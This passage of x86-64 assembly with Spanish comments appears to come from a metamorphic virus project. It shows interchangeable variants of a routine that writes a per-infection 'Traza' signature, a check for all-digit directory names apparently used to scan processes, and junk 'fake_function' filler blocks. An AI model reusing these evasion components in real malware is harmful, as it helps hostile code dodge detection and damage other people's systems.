        ; r8 = buffer a escribir el numbero transformado. r8 apunta al final del buffer,
        ; no al principio. Es porque escribimos del final al principio.
        xor rcx, rcx
        sub rsp, 8
        lea rsi, [rsp+7]

        mov rcx, 8
        mov rbx, 10
        .convert_loop:
            ; rax = numerete
            xor rdx, rdx
            div rbx       ; rax / rbx. rdx = resto.

            add dl, '0'
            mov [rsi], dl
            dec rsi
            dec rcx
            jnz .convert_loop

        lea rsi, [rsp]
        lea rdi, [rel Traza]
        add rdi, Traza_len + 1
        mov rcx, 8
        cld
        rep movsb

        add rsp, 8
        ret
    __F_set_unique_trace_0__end:

    __F_set_unique_trace_1:
        nop
        nop
        nop
        mov rcx, VAR(Death.file_final_len)
        add rax, rcx

        ; lo transformamos haciendo paranoias
        mov rcx, rax
        shl rcx, 13
        xor rax, rcx

        mov rcx, rax
        shr rcx, 17
        xor rax, rcx

        mov rcx, rax
        shl rcx, 5
        xor rax, rcx

            ; Dejamos el numero de forma que sea representable en chars (decimal) en 8 cifras.
        and rax, 0x3FFFFFF

        ; rdi = buf
        ; destruye: rax, rbx, rdx, rcx
        lea rdi, [rel Traza]
        add rdi, Traza_len + 1
        add rdi, 8

        ; rcx = contador (para escribir 8 bytes exactos)
        ; r8 = buffer a escribir el numbero transformado. r8 apunta al final del buffer,
        ; no al principio. Es porque escribimos del final al principio.
        xor rcx, rcx
        sub rsp, 8
        lea rsi, [rsp+7]

        mov rcx, 8
        mov rbx, 10
        .convert_loop:
            ; rax = numerete
            xor rdx, rdx
            div rbx       ; rax / rbx. rdx = resto.

            add dl, '0'
            mov [rsi], dl
            dec rsi
            dec rcx
            jnz .convert_loop

        lea rsi, [rsp]
        lea rdi, [rel Traza]
        add rdi, Traza_len + 1
        mov rcx, 8
        cld
        rep movsb

        add rsp, 8

        ret
    __F_set_unique_trace_1__end:

    __F_set_unique_trace_2:

        nop
        nop
        nop
        mov rcx, VAR(Death.file_final_len)
        add rax, rcx

        ; lo transformamos haciendo paranoias
        mov rcx, rax
        shl rcx, 13
        xor rax, rcx

        mov rcx, rax
        shr rcx, 17
        xor rax, rcx

        mov rcx, rax
        shl rcx, 5
        xor rax, rcx

            ; Dejamos el numero de forma que sea representable en chars (decimal) en 8 cifras.
        and rax, 0x3FFFFFF

        ; rdi = buf
        ; destruye: rax, rbx, rdx, rcx
        lea rdi, [rel Traza]
        add rdi, Traza_len + 1
        add rdi, 8

        ; rcx = contador (para escribir 8 bytes exactos)
        ; r8 = buffer a escribir el numbero transformado. r8 apunta al final del buffer,
        ; no al principio. Es porque escribimos del final al principio.
        xor rcx, rcx
        sub rsp, 8
        lea rsi, [rsp+7]

        mov rcx, 8
        mov rbx, 10
        .convert_loop:
            ; rax = numerete
            xor rdx, rdx
            div rbx       ; rax / rbx. rdx = resto.

            add dl, '0'
            mov [rsi], dl
            dec rsi
            dec rcx
            jnz .convert_loop

        lea rsi, [rsp]
        lea rdi, [rel Traza]
        add rdi, Traza_len + 1
        mov rcx, 8
        cld
        rep movsb

        add rsp, 8
        ret
    __F_set_unique_trace_2__end:

    __F_directory_name_isdigit_0:
        ; rdi = puntero dirent_buffert
        nop
        nop
        push rbx
        lea rsi, [rdi + dirent.d_name]
        xor rcx, rcx ; contador
        .bucle:
            mov bl, [rsi + rcx]
            cmp bl, 0
            je .out
            cmp bl, 0x30
            jl .out
            cmp bl, 0x39
            jg .out
            inc rcx
            jmp .bucle
        .out:
            mov al, bl
            pop rbx
        nop
        ret
    __F_directory_name_isdigit_0__end:


    __F_directory_name_isdigit_1:
        ; rdi = puntero dirent_buffert
        nop
        push rbx
        lea rsi, [rdi + dirent.d_name]
        xor rcx, rcx ; contador
        .bucle:
            mov bl, [rsi + rcx]
            cmp bl, 0
            je .out
            cmp bl, 0x30
            jl .out
            cmp bl, 0x39
            jg .out
            inc rcx
            jmp .bucle
        .out:
            mov al, bl
            pop rbx
        nop
        nop
        ret
    __F_directory_name_isdigit_1__end:

    __F_directory_name_isdigit_2:
        ; rdi = puntero dirent_buffert
        push rbx
        lea rsi, [rdi + dirent.d_name]
        xor rcx, rcx ; contador
        .bucle:
            mov bl, [rsi + rcx]
            cmp bl, 0
            je .out
            cmp bl, 0x30
            jl .out
            cmp bl, 0x39
            jg .out
            inc rcx
            jmp .bucle
        .out:
            mov al, bl
            pop rbx
        nop
        nop
        nop
        ret
    __F_directory_name_isdigit_2__end:

    __F_fake_function_0:
        times 50 xchg eax, ebx
    __F_fake_function_0__end:
    
    __F_fake_function_1:
        times 50 push rax
    __F_fake_function_1__end:
    
    __F_fake_function_2:
        times 50 mov al, 1
    __F_fake_function_2__end:
    
    __F_fake_function_3:
        times 50 or al, 1
    __F_fake_function_3__end:

    _finish:
